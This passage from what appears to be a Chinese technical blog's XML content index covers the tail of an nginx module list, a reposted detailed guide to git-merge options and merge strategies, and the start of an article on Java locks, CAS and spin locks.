  ngx_http_rewrite #通过正则表达式重定向请求
  ngx_http_proxy
  ngx_http_fastcgi #支持 fastcgi
  ngx_http_uwsgi
  ngx_http_scgi
  ngx_http_memcached
  ngx_http_empty_gif #从内存创建一个 1×1 的透明 gif 图片，可以快速调用
  ngx_http_browser #解析 http 请求头部的 User-Agent 值
  ngx_http_charset #指定网页编码
  ngx_http_upstream_ip_hash
  ngx_http_upstream_least_conn
  ngx_http_upstream_keepalive
  ngx_http_write_filter
  ngx_http_header_filter
  ngx_http_chunked_filter
  ngx_http_range_header
  ngx_http_gzip_filter
  ngx_http_postpone_filter
  ngx_http_ssi_filter
  ngx_http_charset_filter
  ngx_http_userid_filter
  ngx_http_headers_filter #设置 http 响应头
  ngx_http_copy_filter
  ngx_http_range_body_filter
  ngx_http_not_modified_filter

可选 HTTP 模块:

  ngx_http_addition #在响应请求的页面开始或者结尾添加文本信息
  ngx_http_degradation #在低内存的情况下允许服务器返回 444 或者 204 错误
  ngx_http_perl
  ngx_http_flv #支持将 Flash 多媒体信息按照流文件传输，可以根据客户端指定的开始位置返回 Flash
  ngx_http_geoip #支持解析基于 GeoIP 数据库的客户端请求
  ngx_google_perftools
  ngx_http_gzip #gzip 压缩请求的响应
  ngx_http_gzip_static #搜索并使用预压缩的以. gz 为后缀的文件代替一般文件响应客户端请求
  ngx_http_image_filter #支持改变 png，jpeg，gif 图片的尺寸和旋转方向
  ngx_http_mp4 #支持. mp4,.m4v,.m4a 等多媒体信息按照流文件传输，常与 ngx_http_flv 一起使用
  ngx_http_random_index #当收到 / 结尾的请求时，在指定目录下随机选择一个文件作为 index
  ngx_http_secure_link #支持对请求链接的有效性检查
  ngx_http_ssl #支持 https
  ngx_http_stub_status
  ngx_http_sub_module #使用指定的字符串替换响应中的信息
  ngx_http_dav #支持 HTTP 和 WebDAV 协议中的 PUT/DELETE/MKCOL/COPY/MOVE 方法
  ngx_http_xslt #将 XML 响应信息使用 XSLT 进行转换

邮件服务模块:

  ngx_mail_core
  ngx_mail_pop3
  ngx_mail_imap
  ngx_mail_smtp
  ngx_mail_auth_http
  ngx_mail_proxy
  ngx_mail_ssl

第三方模块：

  echo-nginx-module #支持在 nginx 配置文件中使用 echo/sleep/time/exec 等类 Shell 命令
  memc-nginx-module
  rds-json-nginx-module #使 nginx 支持 json 数据的处理
  lua-nginx-module

感谢阅读~
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>git-merge详解</title>
    <url>/2021/03/17/git-merge%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[git-merge 完全解析
Git 的 git-merge 是在 Git 中频繁使用的一个命令，很多人都觉得 git 合并是一个非常麻烦的事情，一不小心就会遇到丢失代码的问题，从而对 git 望而却步。本文基于 Git 2.8.2 对 git-merge 命令进行完整详细的介绍，特别是关于交叉合并所带来的代码遗失问题，在文末给出自己的建议，希望能够帮助到 git 的使用者。本文所介绍的内容基于 Git 2.8.2

git-merge 命令是用于将两个或两个以上的开发历史合并在一起的操作，通常也可写作：git merge。

转载：https://www.jianshu.com/p/58a166f24c81



1 git-merge 相关的选项参数1.1 摘要在 git-merge 命令中，有以下三种使用参数：

  git merge [-n] [--stat] [--no-commit] [--squash] [--[no-]edit] [-s &lt;strategy&gt;] [-X &lt;strategy-option&gt;] [-S[&lt;keyid&gt;]] [--[no-]rerere-autoupdate] [-m &lt;msg&gt;] [&lt;commit&gt;...]
  git merge &lt;msg&gt; HEAD &lt;commit&gt;...
  git merge --abort

1.2 git-merge 简介git-merge 命令是用于从指定的 commit(s) 合并到当前分支的操作。

注：这里的指定 commit(s) 是指从这些历史 commit 节点开始，一直到当前分开的时候。

git-merge 命令有以下两种用途：

 用于 git-pull 中，来整合另一代码仓库中的变化（即：git pull = git fetch + git merge）
 用于从一个分支到另一个分支的合并

假设下面的历史节点存在，并且当前所在的分支为 “master”：  
 7810BEAB-4124-48D7-A185-CD0A1626CFC8.png
那么
git merge topic
命令将会把在 master 分支上二者共同的节点（E 节点）之后分离的节点（即 topic 分支的 A B C 节点）重现在 master 分支上，直到 topic 分支当前的 commit 节点（C 节点），并位于 master 分支的顶部。并且沿着 master 分支和 topic 分支创建一个记录合并结果的新节点，该节点带有用户描述合并变化的信息。

即下图中的 H 节点，C 节点和 G 节点都是 H 节点的父节点。

 C8CF6D76-B282-42E6-ABAF-E481223835FB.png
1.3git merge &lt;msg&gt; HEAD &lt;commit&gt;...命令该命令的存在是由于历史原因，在新版本中不应该使用它，应该使用git merge -m &lt;msg&gt; &lt;commit&gt;....进行替代
1.4 git merge --abort命令该命令仅仅在合并后导致冲突时才使用。git merge --abort将会抛弃合并过程并且尝试重建合并前的状态。但是，当合并开始时如果存在未 commit 的文件，git merge --abort在某些情况下将无法重现合并前的状态。（特别是这些未 commit 的文件在合并的过程中将会被修改时）

警告：运行git-merge时含有大量的未 commit 文件很容易让你陷入困境，这将使你在冲突中难以回退。因此非常不鼓励在使用git-merge时存在未 commit 的文件，建议使用git-stash命令将这些未 commit 文件暂存起来，并在解决冲突以后使用git stash pop把这些未 commit 文件还原出来。

2 参数本部分用于介绍git-merge命令中使用的参数
2.1 --commit和--no-commit--commit参数使得合并后产生一个合并结果的 commit 节点。该参数可以覆盖--no-commit。--no-commit参数使得合并后，为了防止合并失败并不自动提交，能够给使用者一个机会在提交前审视和修改合并结果。
2.2 --edit和-e以及--no-edit--edit和-e用于在成功合并、提交前调用编辑器来进一步编辑自动生成的合并信息。因此使用者能够进一步解释和判断合并的结果。--no-edit参数能够用于接受自动合并的信息（通常情况下并不鼓励这样做）。

如果你在合并时已经给定了-m参数（下文介绍），使用 --edit（或-e）依然是有用的，这将在编辑器中进一步编辑-m所含的内容。


旧版本的节点可能并不允许用户去编辑合并日志信息。

2.3 --ff命令--ff是指 fast-forward 命令。当使用 fast-forward 模式进行合并时，将不会创造一个新的 commit 节点。默认情况下，git-merge采用 fast-forward 模式。关于 fast-forward 模式的详细解释，请看我的另一篇文章：一个成功的 Git 分支模型的 “关于 fast forward” 一节。
2.4 --no-ff命令即使可以使用 fast-forward 模式，也要创建一个新的合并节点。这是当git merge在合并一个 tag 时的默认行为。
2.5 --ff-only命令除非当前 HEAD 节点已经 up-to-date（更新指向到最新节点）或者能够使用 fast-forward 模式进行合并，否则的话将拒绝合并，并返回一个失败状态。
2.5 --log[=&lt;n&gt;]和 --no-log--log[=&lt;n&gt;]将在合并提交时，除了含有分支名以外，还将含有最多 n 个被合并 commit 节点的日志信息。--no-log并不会列出该信息。
2.6 --stat, -n, --no-stat命令--stat参数将会在合并结果的末端显示文件差异的状态。文件差异的状态也可以在 git 配置文件中的 merge.stat 配置。相反，-n, --no-stat参数将不会显示该信息。
2.7 --squash 和--no-squash--squash 当一个合并发生时，从当前分支和对方分支的共同祖先节点之后的对方分支节点，一直到对方分支的顶部节点将会压缩在一起，使用者可以经过审视后进行提交，产生一个新的节点。

注意 1: 该参数和--no-ff冲突


注意 2: 该参数使用后的结果类似于在当前分支提交一个新节点。在某些情况下这个参数非常有用，例如使用 Git Flow 时（关于 Git Flow，请参考：一个成功的 Git 分支模型），功能分支在进行一个功能需求的研发时，开发者可能在本地提交了大量且无意义的节点，当需要合并到 develop 分支时，可能仅仅需要用一个新的节点来表示这一长串节点的修改内容，这时--squash命令将会发挥作用。此外，如果功能分支的多次提交并不是琐碎而都是有意义的，使用--no-ff命令更为合适。--no-squash的作用正好相反。

2.8 -s &lt;strategy&gt;和 --strategy=&lt;strategy&gt;-s &lt;strategy&gt;和 --strategy=&lt;strategy&gt;用于指定合并的策略。默认情况如果没有指定该参数，git 将按照下列情况采用默认的合并策略：

 合并节点只含有单个父节点时（如采用 fast-forward 模式时），采用 recursive 策略（下文介绍）。
 合并节点含有多个父节点时 (如采用 no-fast-forward 模式时)，采用 octopus 策略（下文介绍）。

2.9 -X &lt;option&gt;和 --strategy-option=&lt;option&gt;在-s &lt;strategy&gt;时指定该策略的具体参数（下文介绍）。
2.10 --verify-signatures, --no-verify-signatures用于验证被合并的节点是否带有 GPG 签名，并在合并中忽略那些不带有 GPG 签名验证的节点。(以下引用摘自一篇转载的文章，由于我没有找到原作者，因此无法提供原作者信息和原文链接，如果有所侵权请私信或者评论告知，我将删除以下引用内容。)

GPG 是加密软件，可以使用 GPG 生成的公钥在网上安全的传播你的文件、代码。为什么说安全的？以 Google 所开发的 repo 为例，repo 即采用 GPG 验证的方式，每个里程碑 tag 都带有 GPG 加密验证，假如在里程碑 v1.12.3 处你想要做修改，修改完后将这个 tag 删除，然后又创建同名 tag 指向你的修改点，这必然是可以的。但是，在你再次 clone 你修改后的项目时，你会发现，你对此里程碑 tag 的改变不被认可，验证失败，导致你的修改在这里无法正常实现。这就是 GPG 验证的作用，这样就能够保证项目作者（私钥持有者）所制定的里程碑别人将无法修改。那么，就可以说，作者的代码是安全传播的。为什么会有这种需求？一个项目从开发到发布，再到后期的更新迭代，一定会存在若干的稳定版本与开发版本（存在不稳定因素）。作为项目发起者、持有者，有权定义他（们）所认可的稳定版本，这个稳定版本，将不允许其他开发者进行改动。还以 Google 的 repo 项目为例，项目所有者定义项目开发过程中的点 A 为稳定版 v1.12.3，那么用户在下载 v1.12.3 版本后，使用的肯定是 A 点所生成的项目、产品，就算其他开发者能够在本地对 v1.12.3 进行重新指定，指定到他们修改后的 B 点，但是最终修改后的版本给用户用的时候，会出现 GPG 签名验证不通过的问题，也就是说这样的修改是不生效的。

2.11 —summary,--no-summary和--stat与 --no-stat相似，并将在未来版本移除。
2.12 -q和 --quiet静默操作，不显示合并进度信息。
2.13 -v和 --verbose显示详细的合并结果信息。
2.14 --progress和 --no-progress切换是否显示合并的进度信息。如果二者都没有指定，那么在标准错误发生时，将在连接的终端显示信息。请注意，并不是所有的合并策略都支持进度报告。
2.15 -S[&lt;keyid&gt;]和 --gpg-sign[=&lt;keyid&gt;]GPG 签名。
2.16 -m &lt;msg&gt;设置用于创建合并节点时的提交信息。如果指定了--log参数，那么 commit 节点的短日志将会附加在提交信息里。
2.17 --[no-]rerere-autoupdatererere 即 reuse recorded resolution，重复使用已经记录的解决方案。它允许你让 Git 记住解决一个块冲突的方法，这样在下一次看到相同冲突时，Git 可以为你自动地解决它。
2.18 --abort抛弃当前合并冲突的处理过程并尝试重建合并前的状态。
3 关于合并的其他概念3.1 合并前的检测在合并外部分支时，你应当保持自己分支的整洁，否则的话当存在合并冲突时将会带来很多麻烦。为了避免在合并提交时记录不相关的文件，如果有任何在 index 所指向的 HEAD 节点中登记的未提交文件，git-pull 和 git-merge 命令将会停止。
3.2 fast-forward 合并通常情况下分支合并都会产生一个合并节点，但是在某些特殊情况下例外。例如调用 git pull 命令更新远端代码时，如果本地的分支没有任何的提交，那么没有必要产生一个合并节点。这种情况下将不会产生一个合并节点，HEAD 直接指向更新后的顶端代码，这种合并的策略就是 fast-forward 合并。
3.3 合并细节除了上文所提到的 fast-forward 合并模式以外，被合并的分支将会通过一个合并节点和当前分支绑在一起，该合并节点同时拥有合并前的当前分支顶部节点和对方分支顶部节点，共同作为父节点。一个合并了的版本将会使所有相关分支的变化一致，包括提交节点，HEAD 节点和 index 指针以及节点树都会被更新。只要这些节点中的文件没有重叠的地方，那么这些文件的变化都会在节点树中改动并更新保存。如果无法明显地合并这些变化，将会发生以下的情况：

 HEAD 指针所指向的节点保持不变
 MERGE_HEAD指针被置于其他分支的顶部
 已经合并干净的路径在 index 文件和节点树中同时更新
 对于冲突路径，index 文件记录了三个版本：版本 1 记录了二者共同的祖先节点，版本 2 记录了当前分支的顶部，即 HEAD，版本 3 记录了MERGE_HEAD。节点树中的文件包含了合并程序运行后的结果。例如三路合并算法会产生冲突。
其他方面没有任何变化。特别地，你之前进行的本地修改将继续保持原样。 如果你尝试了一个导致非常复杂冲突的合并，并想重新开始，那么可以使用git merge --abort


关于三路合并算法：三路合并算法是用于解决冲突的一种方式，当产生冲突时，三路合并算法会获取三个节点：本地冲突的 B 节点，对方分支的 C 节点，B，C 节点的共同最近祖先节点 A。三路合并算法会根据这三个节点进行合并。具体过程是，B，C 节点和 A 节点进行比较，如果 B，C 节点的某个文件和 A 节点中的相同，那么不产生冲突；如果 B 或 C 只有一个和 A 节点相比发生变化，那么该文件将会采用该变化了的版本；如果 B 和 C 和 A 相比都发生了变化，且变化不相同，那么则需要手动去合并; 如果 B，C 都发生了变化，且变化相同，那么并不产生冲突，会自动采用该变化的版本。最终合并后会产生 D 节点，D 节点有两个父节点，分别为 B 和 C。

3.4 合并 tag当合并一个 tag 时，Git 总是创建一个合并的提交，即使这时能够使用 fast-forward 模式。该提交信息的模板预设为该 tag 的信息。额外地，如果该 tag 被签名，那么签名的检测信息将会附加在提交信息模板中。
3.5 冲突是如何表示的当产生合并冲突时，该部分会以&lt;&lt;&lt;&lt;&lt;&lt;&lt;, =======和 &gt;&gt;&gt;&gt;&gt;&gt;&gt;表示。在=======之前的部分是当前分支这边的情况，在=======之后的部分是对方分支的情况。
3.6 如何解决冲突在看到冲突以后，你可以选择以下两种方式：

  决定不合并。这时，唯一要做的就是重置 index 到 HEAD 节点。git merge --abort用于这种情况。
解决冲突。Git 会标记冲突的地方，解决完冲突的地方后使用git add加入到 index 中，然后使用git commit产生合并节点。  你可以用以下工具来解决冲突:
  使用合并工具。git mergetool将会调用一个可视化的合并工具来处理冲突合并。
  查看差异。git diff将会显示三路差异（三路合并中所采用的三路比较算法）。
  查看每个分支的差异。git log --merge -p &lt;path&gt;将会显示HEAD版本和MERGE_HEAD版本的差异。
  查看合并前的版本。git show :1:文件名显示共同祖先的版本，git show :2:文件名显示当前分支的 HEAD 版本，git show :3:文件名显示对方分支的MERGE_HEAD版本。

4 合并策略Git 可以通过添加 - s 参数来指定合并的策略。一些合并策略甚至含有自己的参数选项，通过-X&lt;option&gt;设置这些合并策略的参数选项。(不要忘记，合并可以在 git merge 和 git pull 命令中发生，因此该合并策略同样适用于 git pull)。
4.1 resolve仅仅使用三路合并算法合并两个分支的顶部节点（例如当前分支和你拉取下来的另一个分支）。这种合并策略遵循三路合并算法，由两个分支的 HEAD 节点以及共同子节点进行三路合并。当然，真正会困扰我们的其实是交叉合并（criss-cross merge）这种情况。所谓的交叉合并，是指共同祖先节点有多个的情况，例如在两个分支合并时，很有可能出现共同祖先节点有两个的情况发生，这时候无法按照三路合并算法进行合并（因为共同祖先节点不唯一）。resolve 策略在解决交叉合并问题时是这样处理的，这里参考《Version Control with Git》：

In criss-cross merge situations, where there is more than one possible merge basis, the resolve strategy works like this: pick one of the possible merge bases, and hope for the best. This is actually not as bad as it sounds. It often turns out that the users have been working on different parts of the code. In that case, Git detects that it&#39;s remerging some changes that are already in place and skips the duplicate changes, avoiding the conflict. Or, if these are slight changes that do cause conflict, at least the conflict should be easy for the developer to handle

这里简单翻译一下：在交叉合并的情况时有一个以上的合并基准点（共同祖先节点），resolve 策略是这样工作的：选择其中一个可能的合并基准点并期望这是合并最好的结果。实际上这并没有听起来的那么糟糕。通常情况下用户修改不同部分的代码，在这种情况下，很多的合并冲突其实是多余和重复的。而使用 resolve 进行合并时，产生的冲突也较易于处理，真正会遗失代码的情况很少。
4.2 recursive仅仅使用三路合并算法合并两个分支。和 resolve 不同的是，在交叉合并的情况时，这种合并方式是递归调用的，从共同祖先节点之后两个分支的不同节点开始递归调用三路合并算法进行合并，如果产生冲突，那么该文件不再继续合并，直接抛出冲突；其他未产生冲突的文件将一直执行到顶部节点。额外地，这种方式也能够检测并处理涉及修改文件名的操作。这是 git 合并和拉取代码的默认合并操作。recursive 合并策略有以下参数：
4.2.1 ours该参数将强迫冲突发生时，自动使用当前分支的版本。这种合并方式不会产生任何困扰情况，甚至 git 都不会去检查其他分支版本所包含的冲突内容这种方式会抛弃对方分支任何冲突内容。
4.2.2 theirs正好和 ours 相反。theirs 和 ours 参数都适用于合并二进制文件冲突的情况。
4.2.2 patience在这种参数下，git merge-recursive花费一些额外的时间来避免错过合并一些不重要的行（如函数的括号）。如果当前分支和对方分支的版本分支分离非常大时，建议采用这种合并方式。
4.2.3 diff-algorithm=[patience|minimal|histogram|myers]告知git merge-recursive使用不同的比较算法。
4.2.4 ignore-space-change, ignore-all-space, ignore-space-at-eol根据指定的参数来对待空格冲突。

  如果对方的版本仅仅添加了空格的变化，那么冲突合并时采用我们自己的版本
  如果我们的版本含有空格，但是对方的版本包含大量的变化，那么冲突合并时采用对方的版本
  采用正常的处理过程

4.2.5 no-renames关闭重命名检测。
4.2.6subtree[=&lt;path&gt;]该选项是 subtree 合并策略的高级形式，将会猜测两颗节点树在合并的过程中如何移动。不同的是，指定的路径将在合并开始时除去，以使得其他路径能够在寻找子树的时候进行匹配。（关于 subtree 合并策略详见下文）
4.3 octopus这种合并方式用于两个以上的分支，但是在遇到冲突需要手动合并时会拒绝合并。这种合并方式更适合于将多个分支捆绑在一起的情况，也是多分支合并的默认合并策略。
4.4 ours这种方式可以合并任意数量的分支，但是节点树的合并结果总是当前分支所冲突的部分。这种方式能够在替代旧版本时具有很高的效率。请注意，这种方式和 recursive 策略下的 ours 参数是不同的。
4.5 subtreesubtree 是修改版的 recursive 策略。当合并树 A 和树 B 时，如果 B 是 A 的子树，B 首先调整至匹配 A 的树结构，而不是读取相同的节点。
4.5 总结在使用三路合并的策略时（指默认的 recursive 策略），如果一个文件（或一行代码）在当前分支和对方分支都产生变化，但是稍后又在其中一个分支回退，_那么这种回退的变化将会在结果中体现_。这一点可能会使一些人感到困惑。这是由于在合并的过程中，git 仅仅关注共同祖先节点以及两个分支的 HEAD 节点，而不是两个分支的所有节点。因此，合并算法将会把被回退的部分认为成_没有变化_，这样，合并后的结果就会变为另一个分支中变化的部分。
5 关于 Git 使用的一些个人看法本人一直认为 Git 是一款非常优秀的版本控制工具，但是在公司中很多人觉得 Git 很难使用。这种情况很大一部分原因是之前使用 subversion 时带来的使用惯性对接受新技术造成了影响；另一方面，很多人仅仅通过 GUI 客户端去使用 Git。很久以来，大部分人认为使用 GUI 是一种较为便捷的入门方式，其实这是值得商榷的。依我个人的经验来说，使用 GUI 会形成惰性，往往点击几个按钮就能完成操作，使得很多人认为学习 Git 的命令是一种浪费时间和精力的行为。但是事实上，在没有理解清楚 Git 命令和思想的情况下，使用那些简单的按钮其实会带来很大的困扰：很多人根本不知道点击按钮后会发生什么，GUI 的过于智能让同一个按钮的点击事件可能对应着不同参数的命令。最后真正受到伤害的是可怜的使用者们，因为他们根本不知道问题出在哪里。综合全文的内容，这里总结一些个人使用 Git 时所遵守的约定。所谓约定，即非强迫性的，自愿的行为。不遵守这些约定并不会带来什么缺陷，但是遵守这些约定可能会减轻在使用 Git 时带来的困难，提高效率。

 多提交，少推送。多人协作时，推送会频繁地带来合并冲突的问题，影响效率。因此，尽量多使用提交命令，减少合并的使用，这样会节省很多时间。
 使用 Git 流（Git Flow），详见我的另一篇文章：一个成功的 Git 分支模型
 使用分支，_保持主分支的整洁_。这是我强烈推荐的一点，在分支进行提交，然后切到主分支更新 (git pull —rebase)，再合并分支、推送。这样的流程会避免交叉合并的情况出现（不会出现共同祖先节点为多个的情况）。事实上，git 合并操作让很多人感到不知所措的原因就是各种原因所产生的交叉合并问题，从而造成在合并的过程中丢失某些代码。保持主分支的整洁能够避免交叉合并的情况出现。
 禁用 fast-forward 模式。在拉取代码的时候使用 rebase 参数（前提是保持主分支的整洁）、合并的时候使用—no-ff 参数禁用 fast-forward 模式，这样做既能保证节点的清晰，又避免了交叉合并的情况出现。

]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>不可不说的Java“锁”事</title>
    <url>/2021/05/10/%E4%B8%8D%E5%8F%AF%E4%B8%8D%E8%AF%B4%E7%9A%84Java%E2%80%9C%E9%94%81%E2%80%9D%E4%BA%8B/</url>
    <content><![CDATA[前言Java 提供了种类丰富的锁，每种锁因其特性的不同，在适当的场景下能够展现出非常高的效率。本文旨在对锁相关源码（本文中的源码来自 JDK 8 和 Netty 3.10.6）、使用场景进行举例，为读者介绍主流锁的知识点，以及不同的锁的适用场景。
Java 中往往是按照是否含有某一特性来定义锁，我们通过特性将锁进行分组归类，再使用对比的方式进行介绍，帮助大家更快捷的理解相关知识。下面给出本文内容的总体分类目录：



乐观锁 VS 悲观锁乐观锁与悲观锁是一种广义上的概念，体现了看待线程同步的不同角度。在 Java 和数据库中都有此概念对应的实际应用。
先说概念。对于同一个数据的并发操作，悲观锁认为自己在使用数据的时候一定有别的线程来修改数据，因此在获取数据的时候会先加锁，确保数据不会被别的线程修改。Java 中，synchronized 关键字和 Lock 的实现类都是悲观锁。
而乐观锁认为自己在使用数据时不会有别的线程修改数据，所以不会添加锁，只是在更新数据的时候去判断之前有没有别的线程更新了这个数据。如果这个数据没有被更新，当前线程将自己修改的数据成功写入。如果数据已经被其他线程更新，则根据不同的实现方式执行不同的操作（例如报错或者自动重试）。
乐观锁在 Java 中是通过使用无锁编程来实现，最常采用的是 CAS 算法，Java 原子类中的递增操作就通过 CAS 自旋实现的。

根据从上面的概念描述我们可以发现：

  悲观锁适合写操作多的场景，先加锁可以保证写操作时数据正确。
  乐观锁适合读操作多的场景，不加锁的特点能够使其读操作的性能大幅提升。

光说概念有些抽象，我们来看下乐观锁和悲观锁的调用方式示例：
&#x2F;&#x2F; ------------------------- 悲观锁的调用方式 -------------------------
&#x2F;&#x2F; synchronized
public synchronized void testMethod() &#123;
    &#x2F;&#x2F; 操作同步资源
&#125;
&#x2F;&#x2F; ReentrantLock
private ReentrantLock lock &#x3D; new ReentrantLock(); &#x2F;&#x2F; 需要保证多个线程使用的是同一个锁
public void modifyPublicResources() &#123;
    lock.lock();
    &#x2F;&#x2F; 操作同步资源
    lock.unlock();
&#125;

&#x2F;&#x2F; ------------------------- 乐观锁的调用方式 -------------------------
private AtomicInteger atomicInteger &#x3D; new AtomicInteger();  &#x2F;&#x2F; 需要保证多个线程使用的是同一个AtomicInteger
atomicInteger.incrementAndGet(); &#x2F;&#x2F;执行自增1

通过调用方式示例，我们可以发现悲观锁基本都是在显式的锁定之后再操作同步资源，而乐观锁则直接去操作同步资源。那么，为何乐观锁能够做到不锁定同步资源也可以正确的实现线程同步呢？我们通过介绍乐观锁的主要实现方式 “CAS” 的技术原理来为大家解惑。
CAS 全称 Compare And Swap（比较与交换），是一种无锁算法。在不使用锁（没有线程被阻塞）的情况下实现多线程之间的变量同步。java.util.concurrent 包中的原子类就是通过 CAS 来实现了乐观锁。
CAS 算法涉及到三个操作数：

  需要读写的内存值 V。
  进行比较的值 A。
  要写入的新值 B。

当且仅当 V 的值等于 A 时，CAS 通过原子方式用新值 B 来更新 V 的值（“比较 + 更新” 整体是一个原子操作），否则不会执行任何操作。一般情况下，“更新” 是一个不断重试的操作。
之前提到 java.util.concurrent 包中的原子类，就是通过 CAS 来实现了乐观锁，那么我们进入原子类 AtomicInteger 的源码，看一下 AtomicInteger 的定义：

根据定义我们可以看出各属性的作用：

  unsafe： 获取并操作内存的数据。
  valueOffset： 存储 value 在 AtomicInteger 中的偏移量。
  value： 存储 AtomicInteger 的 int 值，该属性需要借助 volatile 关键字保证其在线程间是可见的。

接下来，我们查看 AtomicInteger 的自增函数incrementAndGet()的源码时，发现自增函数底层调用的是 unsafe.getAndAddInt()。但是由于 JDK 本身只有 Unsafe.class，只通过 class 文件中的参数名，并不能很好的了解方法的作用，所以我们通过 OpenJDK 8 来查看 Unsafe 的源码：
&#x2F;&#x2F; ------------------------- JDK 8 -------------------------
&#x2F;&#x2F; AtomicInteger 自增方法
public final int incrementAndGet() &#123;
  return unsafe.getAndAddInt(this, valueOffset, 1) + 1;
&#125;

&#x2F;&#x2F; Unsafe.class
public final int getAndAddInt(Object var1, long var2, int var4) &#123;
  int var5;
  do &#123;
      var5 &#x3D; this.getIntVolatile(var1, var2);
  &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));
  return var5;
&#125;

&#x2F;&#x2F; ------------------------- OpenJDK 8 -------------------------
&#x2F;&#x2F; Unsafe.java
public final int getAndAddInt(Object o, long offset, int delta) &#123;
   int v;
   do &#123;
       v &#x3D; getIntVolatile(o, offset);
   &#125; while (!compareAndSwapInt(o, offset, v, v + delta));
   return v;
&#125;

根据 OpenJDK 8 的源码我们可以看出，getAndAddInt()循环获取给定对象 o 中的偏移量处的值 v，然后判断内存值是否等于 v。如果相等则将内存值设置为 v + delta，否则返回 false，继续循环进行重试，直到设置成功才能退出循环，并且将旧值返回。整个 “比较 + 更新” 操作封装在 compareAndSwapInt()中，在 JNI 里是借助于一个 CPU 指令完成的，属于原子操作，可以保证多个线程都能够看到同一个变量的修改值。
后续 JDK 通过 CPU 的 cmpxchg 指令，去比较寄存器中的 A 和 内存中的值 V。如果相等，就把要写入的新值 B 存入内存中。如果不相等，就将内存值 V 赋值给寄存器中的值 A。然后通过 Java 代码中的 while 循环再次调用 cmpxchg 指令进行重试，直到设置成功为止。
CAS 虽然很高效，但是它也存在三大问题，这里也简单说一下：

ABA 问题。CAS 需要在操作值的时候检查内存值是否发生变化，没有发生变化才会更新内存值。但是如果内存值原来是 A，后来变成了 B，然后又变成了 A，那么 CAS 进行检查时会发现值没有发生变化，但是实际上是有变化的。ABA 问题的解决思路就是在变量前面添加版本号，每次变量更新的时候都把版本号加一，这样变化过程就从 “A－B－A” 变成了“1A－2B－3A”。
  JDK 从 1.5 开始提供了 AtomicStampedReference 类来解决 ABA 问题，具体操作封装在compareAndSet()中。compareAndSet() 首先检查当前引用和当前标志与预期引用和预期标志是否相等，如果都相等，则以原子方式将引用值和标志的值设置为给定的更新值。


 循环时间长开销大。CAS 操作如果长时间不成功，会导致其一直自旋，给 CPU 带来非常大的开销。
只能保证一个共享变量的原子操作。对一个共享变量执行操作时，CAS 能够保证原子操作，但是对多个共享变量操作时，CAS 是无法保证操作的原子性的。
  Java 从 1.5 开始 JDK 提供了 AtomicReference 类来保证引用对象之间的原子性，可以把多个变量放在一个对象里来进行 CAS 操作。



自旋锁 VS 适应性自旋锁在介绍自旋锁前，我们需要介绍一些前提知识来帮助大家明白自旋锁的概念。
阻塞或唤醒一个 Java 线程需要操作系统切换 CPU 状态来完成，这种状态转换需要耗费处理器时间。如果同步代码块中的内容过于简单，状态转换消耗的时间有可能比用户代码执行的时间还要长。
在许多场景中，同步资源的锁定时间很短，为了这一小段时间去切换线程，线程挂起和恢复现场的花费可能会让系统得不偿失。如果物理机器有多个处理器，能够让两个或以上的线程同时并行执行，我们就可以让后面那个请求锁的线程不放弃 CPU 的执行时间，看看持有锁的线程是否很快就会释放锁。
而为了让当前线程 “稍等一下”，我们需让当前线程进行自旋，如果在自旋完成后前面锁定同步资源的线程已经释放了锁，那么当前线程就可以不必阻塞而是直接获取同步资源，从而避免切换线程的开销。这就是自旋锁。

自旋锁本身是有缺点的，它不能代替阻塞。自旋等待虽然避免了线程切换的开销，但它要占用处理器时间。如果锁被占用的时间很短，自旋等待的效果就会非常好。反之，如果锁被占用的时间很长，那么自旋的线程只会白浪费处理器资源。所以，自旋等待的时间必须要有一定的限度，如果自旋超过了限定次数（默认是 10 次，可以使用 - XX:PreBlockSpin 来更改）没有成功获得锁，就应当挂起线程。
自旋锁的实现原理同样也是 CAS，AtomicInteger 中调用 unsafe 进行自增操作的源码中的 do-while 循环就是一个自旋操作，如果修改数值失败则通过循环来执行自旋，直至修改成功。

自旋锁在 JDK1.4.2 中引入，使用 - XX:+UseSpinning 来开启。JDK 6 中变为默认开启，并且引入了自适应的自旋锁（适应性自旋锁）。
自适应意味着自旋的时间（次数）不再固定，而是由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定。如果在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持有锁的线程正在运行中，那么虚拟机就会认为这次自旋也是很有可能再次成功，进而它将允许自旋等待持续相对更长的时间。如果对于某个锁，自旋很少成功获得过，那在以后尝试获取这个锁时将可能省略掉自旋过程，直接阻塞线程，避免浪费处理器资源。
在自旋锁中 另有三种常见的锁形式: TicketLock、CLHlock 和 MCSlock，本文中仅做名词介绍，不做深入讲解，感兴趣的同学可以自行查阅相关资料。
无锁 VS 偏向锁 VS 轻量级锁 VS 重量级锁这四种锁是指锁的状态，专门针对 synchronized 的。在介绍这四种锁状态之前还需要介绍一些额外的知识。
首先为什么 Synchronized 能实现线程同步？
在回答这个问题之前我们需要了解两个重要的概念：“Java 对象头”、“Monitor”。
Java 对象头synchronized 是悲观锁，在操作同步资源之前需要给同步资源先加锁，这把锁就是存在 Java 对象头里的，而 Java 对象头又是什么呢？
我们以 Hotspot 虚拟机为例，Hotspot 的对象头主要包括两部分数据：Mark Word（标记字段）、Klass Pointer（类型指针）。
Mark Word：默认存储对象的 HashCode，分代年龄和锁标志位信息。这些信息都是与对象自身定义无关的数据，所以 Mark Word 被设计成一个非固定的数据结构以便在极小的空间内存存储尽量多的数据。它会根据对象的状态复用自己的存储空间，也就是说在运行期间 Mark Word 里存储的数据会随着锁标志位的变化而变化。
Klass Point：对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。
MonitorMonitor 可以理解为一个同步工具或一种同步机制，通常被描述为一个对象。每一个 Java 对象就有一把看不见的锁，称为内部锁或者 Monitor 锁。
Monitor 是线程私有的数据结构，每一个线程都有一个可用 monitor record 列表，同时还有一个全局的可用列表。每一个被锁住的对象都会和一个 monitor 关联，同时 monitor 中有一个 Owner 字段存放拥有该锁的线程的唯一标识，表示该锁被这个线程占用。
现在话题回到 synchronized，synchronized 通过 Monitor 来实现线程同步，Monitor 是依赖于底层的操作系统的 Mutex Lock（互斥锁）来实现的线程同步。
